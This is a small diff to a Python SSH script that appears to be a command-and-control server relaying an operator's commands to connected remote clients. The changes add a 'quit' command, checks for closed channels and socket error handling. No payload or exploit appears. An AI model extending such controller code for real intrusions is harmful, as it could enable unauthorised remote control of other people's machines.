@@ -78,6 +78,9 @@ def contr_handler(contr_ssh_session, contr_ssh_channel):
             try: contr_ssh_channel.send(get_client_path(int(command[1])))
             except IndexError:
                 contr_ssh_channel.send("[SERVER] Invalid Client\n")
+        elif command[0] == "quit":
+            contr_ssh_session.close()
+            return
         elif command[0] == "ping":
             contr_ssh_channel.send("[SERVER] pong")
         else:
@@ -86,8 +89,9 @@ def contr_handler(contr_ssh_session, contr_ssh_channel):
 def exit_client_sessions():
     for client in connected_clients[:]:
         try:
-            client[2].send("quit")
-            client[1].close()
+            if not client[2].closed:
+                client[2].send("quit")
+                client[1].close()
             connected_clients.remove(client)
             # print(f"[*] SSH session closed for {client[0]}")
         except:
@@ -179,7 +183,11 @@ def controller():
                 contr_ssh_session.close()
             else:
                 # print("[*] SSH Controller Authenticated")
-                contr_handler(contr_ssh_session, contr_ssh_channel)
+                try:
+                    contr_handler(contr_ssh_session, contr_ssh_channel)
+                except OSError as err:
+                    if str(err) != "Socket is closed": raise
+                    # print("[*] Controller Disconnected")
         except KeyboardInterrupt:
             # print("[*] Exiting Script")
             try:
